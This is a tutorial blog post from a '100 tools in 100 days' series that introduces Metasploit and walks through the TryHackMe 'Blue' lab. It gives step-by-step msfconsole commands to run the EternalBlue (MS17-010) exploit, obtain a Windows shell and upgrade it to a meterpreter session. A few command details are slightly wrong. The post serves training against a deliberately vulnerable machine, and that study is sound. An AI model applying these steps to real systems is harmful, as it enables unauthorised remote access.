---
title:  "Day 57 - Metasploit - 100 tools in 100 days!"
excerpt: "In this post, I will show you the tool Metasploit and how it works."
mathjax: true
layout: post
categories:
    -- github
    -- website
---

1 . Introduction
<br>
2 . My Setup
<br>
3 . What is Metasploit?
<br>
4 . Why use Metasploit?
<br>
5 . How to use Metasploit?
<br>
6 . Summary

---

## This post is designed to introduce you to the tool Metasploit.

![](PLACEHOLDER_TOOL_PHOTO)

# <span style="color:red">***Disclaimer***</span> : **Please only use Metasploit for professional and educational reasons. Do not use this tool for nefarious or malicious reasons.**

---

### 1. **Introduction**

Welcome to the **fifty-seventh** blog post of 100 tools in 100 days.<br> 

Find **Metasploit** @ GitHub [here](https://github.com/rapid7/metasploit-framework).

Metasploit was created by HD Moore, the same creator of runZero, find him [here](https://www.linkedin.com/in/hdmoore/).




---

### 2. **My Setup**

For running the Metasploit tool, I used Kali Linux in a VMware Workstation 16 Player virtualized environment.

For my vulnerable device I am using the Try Hack Me room [Blue](https://tryhackme.com/room/blue).

### **<span style="color:red">Spolier</span>**:  I am going to basically cover the entire section of the Blue room that deals with Metasploit. If you have not attempted that, then you should do that before, or even use this post as a guide. 

---

### 3. **What is Metasploit?**

Metasploit was created in the early 2000's by HD Moore who was working as a security analyst performing assessments and penetration tests for organizations. He needed a tool that offered organization and quick retrieval of exploits, payloads and techniques. He created Metasploit to aid him during testing to save time and create a one stop shop for attacks. 

Today in 2022 Metasploit is still a major tool used by security researchers globally. It has adapted, been upgraded, became purchased, closed source, and then open source in the past 20 years. Today rapid7 offers two options for using metasploit, the free and open source option and a pro version with additional features. 

---

### 4. **Why use Metasploit?**

Security researchers and penetration testers can rely on Metasploit as a all-in-one tool for performing attacks, analysis and research on infrastructure, networks and systems they manage. 

---

### 5. **How to use Metasploit?**

Metasploit comes installed on Kali Linux!

    Step 1:
    Before you use Metasploit for the first time, update it by entering the 
    following command:

    msfupdate

<br>
![]()

I am going to use Metasploit to perform the eternal blue attack against the Try Hack Me room "Blue". Below is the screenshot from Nmap which tells me the vulnerable service for Eternal blue. 

<br>

![](0)

    Step 2:
    Start Metasploit by entering the following command:

    msfconsole

<br>

![](3)

    Step 3:
    Enter the following command to see the help page:

    help

<br>

![]()

    Step 4:
    To find exploits and payloads related to a vulnerability enter the 
    following command:

    search <vulnerability keywords>

<br>

![]

    Step 5:
    Specify and select the module for your situation, for this it is module 
    0 - exploit/windows/smb/ms17_010_eternalblue

    To select the module you want to use enter the following command:

    use exploit/windows/smb/ms17_010_eternalblue

    or 

    use 0

<br>

Note, you can skip the search section of step 4 by using the command:

use /full/pathto/module

![]()

    Step 6:
    You will notice that your module is loaded into the command line which 
    tells you which module you are working with as you use Metasploit.

    Every module has specific options for use, enter the following to see 
    the selected module options:

    show options

<br>

![]()

    Step 7:
    For this module I need to set up some options like RHOSTS and LHOSTS. 
    For this particular vulnerability I do not need to set the optional 
    selections. The other options that are require are already set to 
    default and will work for our use.

    Enter the following command to change the RHOSTS and LHOSTS:

    set rhosts <DOMAIN,IP,HOST>

    set lhosts <DOMAIN,IP,HOST>

<br>

![]()

    Step 8:
    After setting all necessary options I can run the exploit by entering 
    the following:

    run

<br>

![]()

We achieved access to the machine that is vulnerable to Eternal Blue and have a windows command line. 

    Step 9:
    We want to upgrade our command line in the windows machine to a 
    meterpreter shell. This will give us more options to interact with the 
    system. 

    In order to achieve this, we must pause the current session (place it in 
    the background) and return to Metasploit. Press the following keys to 
    store this session in the background:

    Ctrl + Z and type Y then hit enter to confirm selection

<br>

![]

    Step 9:
    I need to find a shell to metrpreter exploit, I know the name of it 
    already so I did not use the search function, but you can if you need 
    to. Enter the following command:

    use post/multi/manage/shell_to_meterpreter

<br>

![]()

    Step 10:
    Verify your store session ID by entering the following command:

    sessions -l

<br>

![]()

    Step 11:
    Just like in step 6 we need to see the options required for this 
    meterpreter upgrade exploit. Enter the following command:

    show options

<br>

![]()

As you can see we need to select a backgrounded session and specify a LHOSTS.

    Step 12:
    Enter the following information to select the session and set LHOSTS:

    set session 1

    select lhosts <DOMAIN,IP,HOST>

<br>

![]()

    Step 13:
    Enter the following command to run the exploit and verify the new session is available:

    run

    sessions

<br>

![]()

    Step 14:
    Select the newly created session by entering the following:
    
    sessions -i 2

<br>

![]()

The new meterpreter session is started and now you have access to the vulnerable system where you can further perform attack measures. 

### 6. **Summary**

Metasploit might be one of the most influential and important tools ever created in the information security industry. Metasploit made penetration testing easier and faster for researchers. It showed the industry that anyone with an understanding of command line could hack systems quickly and efficiently. 

HD Moore's creation of Metasploit helped increase security awareness and research for the past two decades and continues to be relevant today. 

I hope you enjoyed this blog post.

Thanks for reading!<br>

If you have suggestions for what tool to cover next, [contact](mailto:matthew.o.mccorkle@gmail.com) me!
